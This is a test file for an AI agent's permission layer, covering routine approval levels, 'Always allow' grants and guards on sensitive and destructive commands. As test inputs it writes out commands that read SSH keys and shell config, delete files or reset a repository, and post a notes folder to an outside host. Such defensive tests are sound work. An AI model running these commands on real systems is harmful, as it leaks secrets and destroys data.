// Copyright 2026 Ferrox Labs
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// A routine's approval level: what it inherits, what an explicit choice
// overrides, and how the verdict treats a routine run at each level. The
// case behind it: a No limits bot whose 30-minute routine was judged as Auto,
// hit a card nobody was there to answer and died at its run limit.
import { describe, expect, it } from "vitest";

import { autoVerdict, fullAccessCovers, type AutoContext } from "./auto-approve.ts";
import { fullAccessApprovesSetup } from "./full-access.ts";
import { exactCommandKey } from "../shared/exact-command.ts";
import {
  applyRoutinePermissionMode,
  botPermissionMode,
  effectiveRoutinePermissionMode,
  isRoutineGrantKey,
  loadRoutinePermissionMode,
  routineGrantKeys,
  routinePermissionModeInput,
  type RoutinePermissionMode,
} from "./routine-permissions.ts";

const ask = { autoApprove: false, fullAccess: false, noLimits: false, alwaysAllow: [] };
const auto = { autoApprove: true, fullAccess: false, noLimits: false, alwaysAllow: [] };
const full = { autoApprove: true, fullAccess: true, noLimits: false, alwaysAllow: [] };
const unlimited = { autoApprove: true, fullAccess: true, noLimits: true, alwaysAllow: [] };

describe("a routine's level", () => {
  it("reads a bot's level from its flags, lowest wins when flags disagree", () => {
    expect(botPermissionMode(ask)).toBe("ask");
    expect(botPermissionMode(auto)).toBe("auto");
    expect(botPermissionMode(full)).toBe("full");
    expect(botPermissionMode(unlimited)).toBe("unlimited");
    // No limits counts only on top of Full access, Full access only on Auto
    expect(botPermissionMode({ autoApprove: true, noLimits: true })).toBe("auto");
    expect(botPermissionMode({ fullAccess: true, noLimits: true })).toBe("ask");
    expect(botPermissionMode(null)).toBe("ask");
  });

  it("inherits the bot's current level unless the routine names one", () => {
    expect(effectiveRoutinePermissionMode({}, unlimited)).toBe("unlimited");
    expect(effectiveRoutinePermissionMode({}, auto)).toBe("auto");
    expect(effectiveRoutinePermissionMode({ permissionMode: "ask" }, unlimited)).toBe("ask");
    expect(effectiveRoutinePermissionMode({ permissionMode: "full" }, ask)).toBe("full");
  });

  it("applies a level as the flags the verdict reads, keeping the grants", () => {
    const granted = { ...ask, alwaysAllow: ["Bash:git"] };
    expect(applyRoutinePermissionMode(granted, "unlimited")).toMatchObject({ autoApprove: true, fullAccess: true, noLimits: true, alwaysAllow: ["Bash:git"] });
    expect(applyRoutinePermissionMode(unlimited, "full")).toMatchObject({ autoApprove: true, fullAccess: true, noLimits: false });
    expect(applyRoutinePermissionMode(unlimited, "auto")).toMatchObject({ autoApprove: true, fullAccess: false, noLimits: false });
    expect(applyRoutinePermissionMode(unlimited, "ask")).toMatchObject({ autoApprove: false, fullAccess: false, noLimits: false });
  });

  it("loads older files as inherit and drops anything unknown", () => {
    expect(loadRoutinePermissionMode(undefined)).toBeUndefined();
    expect(loadRoutinePermissionMode("full")).toBe("full");
    expect(loadRoutinePermissionMode("root")).toBeUndefined();
    expect(loadRoutinePermissionMode(3)).toBeUndefined();
  });

  it("accepts a level or inherit from the editor and refuses anything else", () => {
    expect(routinePermissionModeInput("inherit")).toBeNull();
    expect(routinePermissionModeInput(null)).toBeNull();
    expect(routinePermissionModeInput("unlimited")).toBe("unlimited");
    expect(() => routinePermissionModeInput("everything")).toThrow(/approval level/);
  });
});

describe("a routine run's verdict at each level", () => {
  const routine: AutoContext = { automated: true, routineLevel: true, stopLine: null };
  const outside = { kind: "delete" as const, place: "/Users/ada/Documents", what: "Delete 1 item outside its folder: ~/Documents/x" };
  const at = (mode: RoutinePermissionMode) => applyRoutinePermissionMode(ask, mode);

  it("Full access and No limits cover a routine run only at that level", () => {
    expect(fullAccessCovers(full, "routine")).toBe(true);
    expect(fullAccessCovers(auto, "routine")).toBe(false);
    expect(autoVerdict(at("full"), "Bash", "rm -rf build", routine)).toMatchObject({ source: "full-access" });
    expect(autoVerdict(at("unlimited"), "Bash", "rm -rf build", routine)).toMatchObject({ source: "no-limits" });
    expect(autoVerdict(at("auto"), "Bash", "rm -rf build", routine).source).toBe("destructive-guard");
    expect(autoVerdict(at("auto"), "Bash", "ls", routine).source).toBe("auto-mode");
    expect(autoVerdict(at("ask"), "Bash", "ls", routine).source).toBe("no-grant");
  });

  it("the key guard holds at every level", () => {
    for (const mode of ["ask", "auto", "full", "unlimited"] as const) {
      expect(autoVerdict(at(mode), "Bash", "cat ~/.zshrc", routine).source).toBe("sensitive-guard");
      expect(autoVerdict(at(mode), "Bash", "cat ~/.ssh/id_rsa", { ...routine, stopLine: outside }).source).toBe("sensitive-guard");
    }
  });

  it("the stop line holds below No limits and lifts at No limits", () => {
    for (const mode of ["ask", "auto", "full"] as const) {
      expect(autoVerdict(at(mode), "Bash", "rm -rf ~/Documents/x", { ...routine, stopLine: outside }).source).toBe("stop-line");
    }
    expect(autoVerdict(at("unlimited"), "Bash", "rm -rf ~/Documents/x", { ...routine, stopLine: outside }).source).toBe("no-limits");
  });

  it("setup requests (a new routine, skill or trusted folder) still ask in a routine run", () => {
    expect(fullAccessApprovesSetup({ ...unlimited, fullAccessSetupRequests: true }, "routine")).toBe(false);
    expect(fullAccessApprovesSetup({ ...unlimited, fullAccessSetupRequests: true }, "owner")).toBe(true);
  });

  it("a question is never answered by a routine's level", () => {
    expect(autoVerdict(at("unlimited"), "AskUserQuestion", "Which?", routine).source).toBe("question-tool");
  });

  it("without the routine's level a routine turn is still judged as Auto", () => {
    expect(autoVerdict(full, "Bash", "rm -rf build", { automated: true, stopLine: null }).source).toBe("destructive-guard");
    expect(autoVerdict(unlimited, "Bash", "x", { automated: true, stopLine: outside }).source).toBe("stop-line");
  });

  it("an unattended turn keeps the unattended rules even with a routine's level", () => {
    const webhookish: AutoContext = { ...routine, unattended: true };
    expect(autoVerdict(at("full"), "Bash", "ls", webhookish)).toMatchObject({ approve: null, source: "unattended-block" });
    expect(autoVerdict(at("unlimited"), "Bash", "x", { ...webhookish, stopLine: outside }).approve).toBeNull();
    expect(autoVerdict(at("unlimited"), "Bash", "ls", webhookish).approve).toBeNull();
  });
});

describe("Always allow for this routine", () => {
  const routine: AutoContext = { automated: true, routineLevel: true, stopLine: null };
  const exact = { engine: "claude", cwd: "/Users/ada/work", command: "curl -s https://example.com/rwa | jq ." };
  const exactKey = exactCommandKey(exact)!;
  const outside = { kind: "delete" as const, place: "/Users/ada/Documents/old", what: "Delete 1 item outside its folder: ~/Documents/old" };

  it("covers the same exact command in the same folder on the same engine", () => {
    expect(autoVerdict(ask, "Bash", exact.command, { ...routine, exactCommand: exact, routineAllow: [exactKey] })).toMatchObject({ source: "routine-allow", rule: exactKey });
    const elsewhere = { ...exact, cwd: "/Users/ada" };
    expect(autoVerdict(ask, "Bash", exact.command, { ...routine, exactCommand: elsewhere, routineAllow: [exactKey] }).source).toBe("no-grant");
  });

  it("covers the same command on a later run when only its dates and times changed", () => {
    // the Mac pass: a routine that writes the time into its log asked every run
    const at = (stamp: string) => ({ ...exact, command: `mkdir -p notes && cat >> notes/log.md <<'EOF'\n${stamp}\nEOF\npython3 - <<'EOF'\nwith open('notes/pipeline.md', 'a') as f:\n    f.write('tick\\n')\nEOF` });
    const granted = exactCommandKey(at("2026-09-25 13:19 ICT (Asia/Bangkok)"))!;
    for (const later of ["2026-09-25 13:25 ICT (Asia/Bangkok)", "2026-10-01 09:05 ICT (Asia/Bangkok)"]) {
      expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: at(later), routineAllow: [granted] })).toMatchObject({ source: "routine-allow", rule: granted });
    }
    const stamped = (when: string) => ({ ...exact, command: `echo "run at ${when}" >> notes/log-${when.slice(0, 10)}.md` });
    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: stamped("2026-09-26T07:00:00Z"), routineAllow: [exactCommandKey(stamped("2026-09-25T07:00:00Z"))!] }).source).toBe("routine-allow");
    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: "date; echo Fri 25 Sep 2026 1:25 PM" }, routineAllow: [exactCommandKey({ ...exact, command: "date; echo Thu 24 Sep 2026 11:05 AM" })!] }).source).toBe("routine-allow");
  });

  it("never covers a command whose words changed, only its dates and times", () => {
    const at = (stamp: string, file = "notes/pipeline.md") => ({ ...exact, command: `cat >> notes/log.md <<'EOF'\n${stamp}\nEOF\npython3 - <<'EOF'\nopen('${file}', 'a').write('tick')\nEOF` });
    const granted = exactCommandKey(at("2026-09-25 13:19"))!;
    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: at("2026-09-25 13:25", "notes/other.md"), routineAllow: [granted] }).source).toBe("no-grant");
    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: `${exact.command} && curl -d @notes x.example` }, routineAllow: [exactKey] }).source).toBe("no-grant");
    // plain numbers are not dates: a count or a port is part of the command
    const head = (n: string) => ({ ...exact, command: `head -n ${n} notes/log.md` });
    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: head("99"), routineAllow: [exactCommandKey(head("10"))!] }).source).toBe("no-grant");
    // nor a port mapping, a version or a ratio that only looks like a time
    for (const [before, after] of [["docker run -p 80:80 web", "docker run -p 22:22 web"], ["npm i left-pad@1.2.3", "npm i left-pad@1.3.0"], ["echo 99:99", "echo 12:30"]]) {
      expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: after }, routineAllow: [exactCommandKey({ ...exact, command: before })!] }).source).toBe("no-grant");
    }
    // a date where the grant had other text is not a match either
    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: "echo 2026-09-25" }, routineAllow: [exactCommandKey({ ...exact, command: "echo main" })!] }).source).toBe("no-grant");
    // and the bot's own "Always allow this exact command here" stays exact
    expect(autoVerdict({ ...ask, alwaysAllow: [granted] }, "Bash", "x", { exactCommand: at("2026-09-25 13:25") }).source).toBe("no-grant");
  });

  it("covers a stop-line card through its scoped key, like a task allowance", () => {
    expect(autoVerdict(ask, "Bash", "rm -rf ~/Documents/old/x", { ...routine, stopLine: { ...outside, place: "/Users/ada/Documents/old/x" }, routineAllow: ["stop:delete:/Users/ada/Documents/old"] }))
      .toMatchObject({ source: "routine-allow", rule: "stop:delete:/Users/ada/Documents/old" });
    expect(autoVerdict(ask, "Bash", "x", { ...routine, stopLine: { ...outside, place: "/Users/ada/Desktop" }, routineAllow: ["stop:delete:/Users/ada/Documents/old"] }).source).toBe("stop-line");
  });

  it("is never a bare tool name or a program grant", () => {
    expect(autoVerdict(ask, "Bash", "git status", { ...routine, routineAllow: ["Bash", "Bash:git"] }).source).toBe("no-grant");
    expect(autoVerdict(ask, "mcp__x__send", "{}", { ...routine, routineAllow: ["mcp__x__send"] }).source).toBe("no-grant");
  });

  it("the guards still outrank it", () => {
    const secret = { ...exact, command: "cat ~/.zshrc" };
    expect(autoVerdict(ask, "Bash", secret.command, { ...routine, exactCommand: secret, routineAllow: [exactCommandKey(secret)!] }).source).toBe("sensitive-guard");
    const wipe = { ...exact, command: "git reset --hard" };
    expect(autoVerdict(ask, "Bash", wipe.command, { ...routine, exactCommand: wipe, routineAllow: [exactCommandKey(wipe)!] }).source).toBe("destructive-guard");
    expect(autoVerdict(ask, "Bash", "cat ~/.ssh/id_rsa", { ...routine, stopLine: outside, routineAllow: ["stop:delete:/Users/ada/Documents/old"] }).source).toBe("sensitive-guard");
  });

  it("counts only in a routine run nobody reached from outside", () => {
    expect(autoVerdict(ask, "Bash", exact.command, { exactCommand: exact, routineAllow: [exactKey] }).source).toBe("no-grant");
    expect(autoVerdict(ask, "Bash", exact.command, { ...routine, unattended: true, exactCommand: exact, routineAllow: [exactKey] }).approve).toBeNull();
    expect(autoVerdict(ask, "Bash", "x", { ...routine, unattended: true, stopLine: outside, routineAllow: ["stop:delete:/Users/ada/Documents/old"] }).approve).toBeNull();
    expect(autoVerdict(ask, "Bash", exact.command, { ...routine, scope: "local-computer", exactCommand: exact, routineAllow: [exactKey] }).approve).toBeNull();
  });

  it("keeps only exact-command and stop-line keys", () => {
    expect(routineGrantKeys(["Bash", "Bash:git", exactKey, "stop:delete:/x", "stop:pay:stripe:cus_1", 3, "exact:nonsense"])).toEqual([exactKey, "stop:delete:/x", "stop:pay:stripe:cus_1"]);
    expect(isRoutineGrantKey("Bash:git")).toBe(false);
  });
});
